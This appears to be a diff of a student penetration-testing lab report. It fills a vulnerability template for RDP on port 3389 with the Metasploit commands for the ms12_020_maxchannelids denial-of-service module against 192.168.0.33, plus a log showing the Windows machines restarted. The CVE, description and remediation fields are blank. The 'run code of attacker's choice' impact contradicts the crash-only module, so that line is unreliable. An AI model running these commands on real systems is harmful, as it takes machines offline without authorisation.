@@ -1,6 +1,28 @@
 https://www.rapid7.com/db/modules/auxiliary/dos/windows/rdp/ms12_020_maxchannelids
 https://www.youtube.com/watch?v=8FhEK296jPg
 
+Potential Vulnerability:
+
+	PORT: 3389
+	CVE: 
+	DESCRIPTION:  
+	IMPACT: Run code of attacker's choice
+
+The system is exploitable:
+
+	B: Below is an MSF script to exploit it
+
+		use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+		set RHOST 192.168.0.33
+		exploit
+
+	C: Below explain ways one fixes the VM. 
+
+		1. 
+		
+MetaSploit Log
+====================================================================================================================
+
 msf exploit(ms05_017_msmq) > use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
 msf auxiliary(ms12_020_maxchannelids) > set RHOST 192.168.0.33
 msf auxiliary(ms12_020_maxchannelids) > exploit
@@ -12,45 +34,3 @@ msf auxiliary(ms12_020_maxchannelids) > exploit
 [*] Auxiliary module execution completed
 
 # Windows computers restarted
-
-
-Potential Vulnerability:
-
-	DESCRIPTION, CVE, PORT etc. GOES HERE
-
-Two possibilities, either it is exploitable or not.
-Fill out below as appropriate.
-
-The system is exploitable:
-	A: I can't seem to find a way to exploit it using MSF.
-
-		SHOW THAT YOU TRIED
-
-	B: Below is an MSF script to exploit it
-
-		YOUR SCRIPT GOES HERE
-
-	C: Below explain ways one fixes the VM. 
-
-		YOUR EXPLANATION GOES HERE
-
-The system is not exploitable, explain why the system is not exploitable
-by filling in the following as appropriate:
-
-	A: There is no known vulnerability
-
-		EXPLAIN HOW YOU KNOW
-
-	B: There appears to be a vulnerability, 
-		but the system is configured to mitigate
-		against it.
-
-		EXPLAIN, SHOW THE CONFIG/MITIGATION
-
-	C: Some versions of the service are vulnerable, this one is not. 
-
-		I searched: YOUR ANSWER HERE (PROVIDE LINKS)
-
-		Vulnerable versions include: YOUR ANSWER HERE (LINKS)
-
-		The system is using version: YOUR ANSWER HERE (HOW DID YOU FIND THIS)
